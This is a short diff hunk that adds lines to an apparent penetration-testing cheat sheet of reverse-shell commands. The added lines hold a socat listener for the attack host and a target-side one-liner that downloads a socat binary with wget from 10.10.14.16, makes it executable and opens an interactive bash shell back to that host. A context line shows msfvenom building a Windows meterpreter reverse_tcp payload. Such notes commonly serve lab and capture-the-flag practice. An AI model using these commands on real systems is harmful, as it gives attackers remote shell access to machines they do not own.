@@ -74,6 +74,12 @@ BEGIN {
 }
 
 
+socat
+socat file:`tty`,raw,echo=0 TCP-L:4444
+	-attack host
+wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444
+	--target host
+
 
 WINDOWS
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
